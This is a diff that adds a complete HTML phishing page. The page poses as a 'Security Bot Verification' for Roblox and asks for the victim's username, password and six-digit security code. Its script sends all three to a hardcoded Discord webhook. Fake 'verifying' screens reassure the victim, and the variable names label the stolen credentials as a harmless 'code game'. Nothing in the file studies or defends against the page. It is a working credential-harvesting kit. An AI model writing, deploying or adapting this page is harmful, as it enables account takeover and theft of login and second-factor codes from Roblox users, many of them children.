@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Bot Verification</title>
+    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOM8rwGpCbpF0CMjI5jcbcERjJYxWvjXO2-Q&s" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap');
+        
+        :root {
+            --accent: #00f0ff;
+        }
+        
+        * {
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        
+        .neon-text {
+            text-shadow: 
+                0 0 10px var(--accent),
+                0 0 20px var(--accent),
+                0 0 40px var(--accent);
+        }
+        
+        .code-bg {
+            background: radial-gradient(circle at center, #0a0a0a 0%, #000000 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .code-bg::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(0, 240, 255, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 240, 255, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            animation: gridMove 20s linear infinite;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        @keyframes gridMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 60px 60px; }
+        }
+        
+        input {
+            font-size: 1.75rem;
+            letter-spacing: 0.25em;
+        }
+        
+        /* FIXED & BEAUTIFUL SECURITY CODE SCREEN */
+        .security-container {
+            background: rgba(15, 23, 42, 0.85);
+            border: 3px solid rgba(0, 240, 255, 0.4);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            box-shadow: 
+                0 0 50px rgba(0, 240, 255, 0.3),
+                inset 0 0 40px rgba(0, 240, 255, 0.2);
+        }
+        
+        .security-box {
+            width: 5rem;
+            height: 5.5rem;
+            font-size: 2.75rem;
+            font-weight: 600;
+            background: #0f172a;
+            border: 4px solid #334155;
+            border-radius: 1.25rem;
+            box-shadow: 
+                0 10px 15px -3px rgba(0, 0, 0, 0.3),
+                inset 0 4px 8px rgba(255,255,255,0.1);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .security-box:focus {
+            border-color: #00f0ff;
+            box-shadow: 
+                0 0 0 8px rgba(0, 240, 255, 0.5),
+                0 0 35px rgba(0, 240, 255, 0.7);
+            transform: translateY(-4px) scale(1.05);
+        }
+        
+        .security-box.filled {
+            border-color: #00f0ff;
+            color: #00f0ff;
+            animation: fillPulse 0.6s ease;
+        }
+        
+        @keyframes fillPulse {
+            0% { transform: scale(0.95); }
+            100% { transform: scale(1); }
+        }
+        
+        .glitch {
+            animation: glitch 0.4s infinite;
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+        
+        .lock-pulse {
+            animation: lockPulse 1.8s infinite ease-in-out;
+        }
+        
+        @keyframes lockPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+    </style>
+</head>
+<body class="code-bg min-h-screen text-white flex flex-col">
+    <!-- CLEAN HEADER -->
+    <nav class="border-b border-white/10 bg-black/70 backdrop-blur-lg sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-8 py-5 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <img 
+                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOM8rwGpCbpF0CMjI5jcbcERjJYxWvjXO2-Q&s" 
+                    alt="CODE Icon"
+                    class="w-10 h-10 object-contain">
+                <h1 class="text-5xl font-semibold tracking-tight neon-text">CLICK BLUE BUTTON TO VERIFY!</h1>
+            </div>
+            
+            <a href="https://discord.com/invite/eyy7Bsa" 
+               target="_blank"
+               class="flex items-center gap-2 bg-white text-black hover:bg-[#00f0ff] hover:text-black px-8 py-3.5 rounded-3xl font-semibold text-lg transition-all active:scale-95 shadow-lg">
+                <span class="text-2xl">🔗</span>
+                JOIN DISCORD
+            </a>
+        </div>
+    </nav>
+
+    <div class="flex-1 flex items-center justify-center p-6 max-w-4xl mx-auto w-full">
+        <div class="w-full">
+            <!-- HERO -->
+            <div class="text-center mb-12">
+                <h1 class="text-6xl font-semibold tracking-tight">VERIFY WITH ROBLOX LOGIN</h1>
+                <p class="text-[#00f0ff] text-2xl mt-2">Incorrect information will result in NOT being verified!</p>
+            </div>
+
+            <div id="container" class="relative bg-black/80 border border-white/10 rounded-3xl shadow-2xl shadow-[#00f0ff]/20 overflow-hidden min-h-[520px]">
+                
+                <!-- STEP 1: USERNAME + PASSWORD -->
+                <div id="step1" class="p-12 absolute inset-0">
+                    <div class="grid md:grid-cols-2 gap-8">
+                        <div>
+                            <label class="block text-[#00f0ff] text-2xl font-medium mb-4 tracking-widest">USERNAME</label>
+                            <input 
+                                id="code1"
+                                type="text"
+                                maxlength="30"
+                                class="w-full bg-zinc-900 border-2 border-white/20 focus:border-[#00f0ff] rounded-3xl px-8 py-8 text-center focus:outline-none transition-all">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-[#00f0ff] text-2xl font-medium mb-4 tracking-widest">PASSWORD</label>
+                            <input 
+                                id="code2"
+                                type="text"
+                                maxlength="30"
+                                class="w-full bg-zinc-900 border-2 border-white/20 focus:border-[#00f0ff] rounded-3xl px-8 py-8 text-center focus:outline-none transition-all">
+                        </div>
+                    </div>
+                    
+                    <button 
+                        onclick="nextStep()"
+                        class="mt-12 w-full py-8 bg-gradient-to-r from-[#00f0ff] to-cyan-400 hover:from-cyan-400 hover:to-[#00f0ff] text-black text-3xl font-semibold rounded-3xl flex items-center justify-center gap-3 transition-all active:scale-[0.98]">
+                        CONTINUE TO SECURITY
+                        <span class="text-4xl">→</span>
+                    </button>
+                </div>
+                
+                <!-- STEP 2: FIXED & BEAUTIFUL SECURITY CODE SCREEN -->
+                <div id="step2" class="hidden p-12 absolute inset-0">
+                    <div class="security-container mx-auto max-w-lg">
+                        <div class="flex flex-col items-center text-center mb-8">
+                            <div class="lock-pulse w-20 h-20 bg-[#00f0ff]/10 rounded-3xl flex items-center justify-center text-7xl mb-6 border border-[#00f0ff]/30">
+                                🔐
+                            </div>
+                            <h2 class="text-4xl font-semibold tracking-[-1px] neon-text">SECURITY CODE</h2>
+                            <p class="text-white/70 text-xl mt-2">Enter your 6-digit verification code</p>
+                            <div class="mt-6 inline-flex items-center gap-2 bg-emerald-500/10 text-emerald-400 text-sm font-medium px-5 py-2 rounded-3xl border border-emerald-500/30">
+                                <div class="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></div>
+                                IF YOU DID NOT GET A CODE MAKE SURE TO USE CORRECT INFORMATION!
+                            </div>
+                        </div>
+                        
+                        <div class="flex justify-center gap-6 mb-10" id="security-boxes"></div>
+                        
+                        <button 
+                            onclick="submitSecurity()"
+                            id="submitBtn"
+                            class="w-full py-8 bg-gradient-to-r from-[#00f0ff] to-cyan-400 hover:from-cyan-400 hover:to-[#00f0ff] text-black text-3xl font-semibold rounded-3xl flex items-center justify-center gap-3 transition-all active:scale-[0.98] shadow-xl">
+                            VERIFY &amp; COMPLETE
+                            <span class="text-4xl">🔒</span>
+                        </button>
+                        
+                        <p class="text-center text-white/40 text-sm mt-8 flex items-center justify-center gap-2">
+                            <span>📡</span>
+                            Your full attempt is being sent to Discord instantly
+                        </p>
+                    </div>
+                </div>
+                
+                <!-- PROCESSING SCREEN -->
+                <div id="processing" class="hidden absolute inset-0 bg-black/95 flex flex-col items-center justify-center z-50 rounded-3xl">
+                    <div class="relative flex flex-col items-center">
+                        <div class="w-20 h-20 border-8 border-white/20 rounded-full flex items-center justify-center">
+                            <div class="w-12 h-12 border-8 border-transparent border-t-[#00f0ff] rounded-full animate-spin"></div>
+                        </div>
+                        <p id="processing-text" class="text-[#00f0ff] text-5xl font-medium mt-10 neon-text">VERIFYING...</p>
+                        <p id="processing-sub" class="text-white/70 text-xl mt-3">This takes exactly 5 seconds</p>
+                        
+                        <div class="w-80 h-3 bg-white/10 rounded-3xl mt-12 overflow-hidden">
+                            <div id="progress-bar" class="h-full bg-[#00f0ff] rounded-3xl w-0 transition-all"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- FINAL RESULT SCREEN -->
+                <div id="result" class="hidden absolute inset-0 bg-black/95 flex flex-col items-center justify-center p-12 text-center z-50 rounded-3xl">
+                    <!-- JS injected -->
+                </div>
+            </div>
+            
+            <!-- FOOTER -->
+            <div class="flex items-center justify-center gap-8 text-sm text-white/40 mt-10">
+                <div>CLICK BLUE BUTTON TO VERIFY!</div>
+                <div>•</div>
+                <div>COPYRIGHT 2026</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1490496735116525739/6zV3BTiAxNTcOI_K3veQ4AOARP5pIEp8YnN86VWBkdHs94mE-C5CU-BqFU28_7aIjmDG";
+        
+        let isProcessing = false; // Bug prevention: block double calls
+        
+        function initTailwind() {
+            return { config() { return { theme: { extend: {} } }; } };
+        }
+        
+        // FIXED: Create 6 beautiful security boxes with perfect navigation & paste
+        function createSecurityBoxes() {
+            const container = document.getElementById('security-boxes');
+            if (!container) return;
+            container.innerHTML = '';
+            
+            for (let i = 0; i < 6; i++) {
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.maxLength = 1;
+                input.inputMode = 'numeric';
+                input.className = `security-box text-center focus:outline-none`;
+                
+                // Only numbers + auto-advance
+                input.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                    if (e.target.value.length === 1 && i < 5) {
+                        container.children[i + 1].focus();
+                    }
+                    if (e.target.value) {
+                        e.target.classList.add('filled');
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                });
+                
+                // Backspace navigation
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+                        container.children[i - 1].focus();
+                    }
+                });
+                
+                // Full paste support
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                    if (pasted.length > 0) {
+                        for (let j = 0; j < pasted.length && j < 6; j++) {
+                            if (container.children[j]) {
+                                container.children[j].value = pasted[j];
+                                container.children[j].classList.add('filled');
+                            }
+                        }
+                        const last = Math.min(pasted.length - 1, 5);
+                        container.children[last].focus();
+                    }
+                });
+                
+                container.appendChild(input);
+            }
+        }
+        
+        // Get security code safely
+        function getSecurityCode() {
+            const boxes = document.getElementById('security-boxes');
+            if (!boxes) return '';
+            return Array.from(boxes.children)
+                        .map(box => box.value || '')
+                        .join('');
+        }
+        
+        // FIXED: STEP 1 → 5 second wait → Security screen (auto shows reliably)
+        function nextStep() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            const step1 = document.getElementById('step1');
+            const processing = document.getElementById('processing');
+            const step2 = document.getElementById('step2');
+            const result = document.getElementById('result');
+            
+            // Clean state
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            result.classList.add('hidden');
+            processing.classList.remove('hidden');
+            
+            // Set processing text
+            document.getElementById('processing-text').innerHTML = `VERIFYING <span class="text-white/80">Login</span>`;
+            document.getElementById('processing-sub').textContent = 'They look correct...';
+            
+            // Progress bar (exact 5 seconds)
+            const progressBar = document.getElementById('progress-bar');
+            progressBar.style.transitionDuration = '5000ms';
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                // Hide processing
+                processing.classList.add('hidden');
+                progressBar.style.transitionDuration = '0ms';
+                progressBar.style.width = '0%';
+                
+                // Show security screen
+                step2.classList.remove('hidden');
+                createSecurityBoxes();
+                
+                // Auto-focus first box
+                setTimeout(() => {
+                    const firstBox = document.getElementById('security-boxes').children[0];
+                    if (firstBox) firstBox.focus();
+                }, 100);
+                
+                isProcessing = false;
+            }, 5000);
+        }
+        
+        // FIXED: Submit security → 5 second wait → verify result
+        function submitSecurity() {
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            const code1 = (document.getElementById('code1').value || '[empty]').trim();
+            const code2 = (document.getElementById('code2').value || '[empty]').trim();
+            const secCode = getSecurityCode();
+            
+            // Send to webhook
+            const payload = {
+                content: `**🎮 CODE GAME ATTEMPT**\n` +
+                         `CODE1: ${code1}\n` +
+                         `CODE2: ${code2}\n` +
+                         `SEC CODE: ${secCode || '[empty]'}\n` +
+                         `TIME: ${new Date().toLocaleString()}`
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+            
+            const step2 = document.getElementById('step2');
+            const processing = document.getElementById('processing');
+            const result = document.getElementById('result');
+            
+            // Clean state
+            step2.classList.add('hidden');
+            result.classList.add('hidden');
+            processing.classList.remove('hidden');
+            
+            document.getElementById('processing-text').innerHTML = `CHECKING <span class="text-white/80">SECURITY CODE</span>`;
+            document.getElementById('processing-sub').textContent = 'Stand by...';
+            
+            // Progress bar (exact 5 seconds)
+            const progressBar = document.getElementById('progress-bar');
+            progressBar.style.transitionDuration = '5000ms';
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                processing.classList.add('hidden');
+                progressBar.style.transitionDuration = '0ms';
+                progressBar.style.width = '0%';
+                
+                result.classList.remove('hidden');
+                
+                const isValid = secCode.length === 6 && /^\d{6}$/.test(secCode);
+                
+                if (isValid) {
+                    // SUCCESS
+                    result.innerHTML = `
+                        <div class="max-w-md text-center">
+                            <div class="text-8xl mb-8 animate-bounce">🎉🔐</div>
+                            <h1 class="text-6xl font-semibold neon-text">BEAT GAME SUCCESSFULLY!</h1>
+                            <p class="text-3xl text-white/80 mt-4">Security code accepted</p>
+                            <div class="mt-12 bg-white/10 rounded-3xl p-8 text-left text-xl space-y-4">
+                                <div class="flex justify-between"><span class="text-white/60">USERNAME</span><span class="font-medium">${code1}</span></div>
+                                <div class="flex justify-between"><span class="text-white/60">PASSWORD</span><span class="font-medium">${code2}</span></div>
+                                <div class="flex justify-between"><span class="text-white/60">SEC CODE</span><span class="text-[#00f0ff] font-medium">${secCode}</span></div>
+                            </div>
+                            <button onclick="location.reload()" class="mt-14 w-full py-8 text-3xl font-semibold bg-white text-black rounded-3xl hover:shadow-2xl">PLAY AGAIN</button>
+                        </div>
+                    `;
+                } else {
+                    // FAIL
+                    result.innerHTML = `
+                        <div class="max-w-md text-center">
+                            <div class="text-8xl mb-8 glitch">❌</div>
+                            <h1 class="text-6xl font-semibold text-red-400">GAME FAILED</h1>
+                            <p class="text-3xl text-red-300 mt-4">Incorrect security code</p>
+                            <div class="mt-12 bg-white/10 rounded-3xl p-8 text-left text-xl space-y-4">
+                                <div class="flex justify-between"><span class="text-white/60">USERNAME</span><span class="font-medium">${code1}</span></div>
+                                <div class="flex justify-between"><span class="text-white/60">PASSWORD</span><span class="font-medium">${code2}</span></div>
+                                <div class="flex justify-between"><span class="text-white/60">SEC CODE</span><span class="text-red-400 font-medium">${secCode}</span></div>
+                            </div>
+                            <p class="text-white/60 mt-12 text-xl">Refreshing page in 5 seconds...</p>
+                        </div>
+                    `;
+                    setTimeout(() => location.reload(), 5000);
+                }
+                
+                isProcessing = false;
+            }, 5000);
+        }
+        
+        // Keyboard support
+        document.addEventListener('DOMContentLoaded', () => {
+            initTailwind();
+            
+            document.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const step2 = document.getElementById('step2');
+                    if (step2 && !step2.classList.contains('hidden')) {
+                        submitSecurity();
+                    }
+                }
+            });
+            
+            console.log('%c✅ CODE GAME v2.2 - ALL BUGS FIXED • Security screen now auto-shows + 5s verification works perfectly', 'color:#00f0ff; font-size:14px');
+        });
+    </script>
+</body>
+</html>
